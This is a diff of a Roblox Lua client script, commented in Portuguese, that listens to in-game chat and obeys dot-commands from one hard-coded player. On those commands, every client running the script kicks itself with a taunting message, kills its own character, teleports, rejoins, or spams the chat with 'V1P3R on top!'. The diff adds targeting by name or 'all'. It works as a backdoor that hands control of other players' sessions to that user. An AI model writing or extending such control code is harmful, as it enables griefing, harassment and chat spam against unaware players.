@@ -42,54 +42,102 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Player = Players.LocalPlayer
 
-local monitoredPlayer = "rbxV1P3R"
+local monitoredPlayer = "rbxV1P3R" -- Seu nome para poder usar comandos gerais
 local spamActive = false
 local spamCoroutine
 
+-- Função para encontrar jogador pelo nome parcial ou retornar todos se for "all"
+local function getTargetPlayers(targetName)
+    targetName = targetName:lower()
+    if targetName == "all" then
+        return Players:GetPlayers()
+    else
+        local foundPlayers = {}
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Name:lower():find(targetName) or player.DisplayName:lower():find(targetName) then
+                table.insert(foundPlayers, player)
+            end
+        end
+        return foundPlayers
+    end
+end
+
 game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering").OnClientEvent:Connect(function(messageData)
-    local message = messageData.Message
+    local message = messageData.Message:lower()
     local speaker = Players:GetPlayerByUserId(messageData.SpeakerUserId)
 
+    -- Verifica se o speaker é você (monitoredPlayer)
     if speaker and speaker.Name == monitoredPlayer then
-        if message:lower() == ".kick" then
-            for _, player in pairs(Players:GetPlayers()) do
-                if player == Player then
+        -- Comando .tpa [all/nome]
+        if message:match("^%.tpa%s+(.+)$") then
+            local targetName = message:match("^%.tpa%s+(.+)$")
+            local targetPlayers = getTargetPlayers(targetName)
+            
+            if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") then
+                for _, targetPlayer in pairs(targetPlayers) do
+                    if targetPlayer == Player then  -- Só teleporta a si mesmo
+                        Player.Character:SetPrimaryPartCFrame(speaker.Character.HumanoidRootPart.CFrame)
+                    end
+                end
+            end
+            
+        -- Comando .kick [all/nome]
+        elseif message:match("^%.kick%s+(.+)$") then
+            local targetName = message:match("^%.kick%s+(.+)$")
+            local targetPlayers = getTargetPlayers(targetName)
+            
+            for _, targetPlayer in pairs(targetPlayers) do
+                if targetPlayer == Player then  -- Só pode kickar a si mesmo
                     Player:Kick("you got kicked loser! by V1P3R")
                 end
             end
-        elseif message:lower() == ".tpa" then
-            for _, player in pairs(Players:GetPlayers()) do
-                if player == Player then
-                    player.Character:SetPrimaryPartCFrame(speaker.Character.HumanoidRootPart.CFrame)
+            
+        -- Comando .kill [all/nome]
+        elseif message:match("^%.kill%s+(.+)$") then
+            local targetName = message:match("^%.kill%s+(.+)$")
+            local targetPlayers = getTargetPlayers(targetName)
+            
+            for _, targetPlayer in pairs(targetPlayers) do
+                if targetPlayer == Player and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+                    targetPlayer.Character.Humanoid.Health = 0
                 end
             end
-        elseif message:lower() == ".spam" then
+            
+        -- Comando .spam [all/nome]
+        elseif message:match("^%.spam%s+(.+)$") then
+            local targetName = message:match("^%.spam%s+(.+)$")
             if not spamActive then
                 spamActive = true
                 spamCoroutine = coroutine.create(function()
                     while spamActive do
                         ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("V1P3R on top!", "All")
-                        wait(0)
+                        task.wait()
                     end
                 end)
                 coroutine.resume(spamCoroutine)
             end
-        elseif message:lower() == ".unspam" then
+            
+        -- Comando .unspam
+        elseif message == ".unspam" then
             if spamActive then
                 spamActive = false
                 if spamCoroutine then
                     coroutine.close(spamCoroutine)
                 end
             end
-        elseif message:lower() == ".rj" then
+            
+        -- Comando .rj
+        elseif message == ".rj" then
             game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
-        elseif message:lower() == ".kill" then
-            if Player.Character and Player.Character:FindFirstChild("Humanoid") then
-                Player.Character.Humanoid.Health = 0
-            end
+            
+        -- Comando .send [all/nome]
+        elseif message:match("^%.send%s+(.+)$") then
+            local targetName = message:match("^%.send%s+(.+)$")
+            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("V1P3R on top!", "All")
         end
     end
 end)
+
 
 local StarterGui = game:GetService("StarterGui")
 
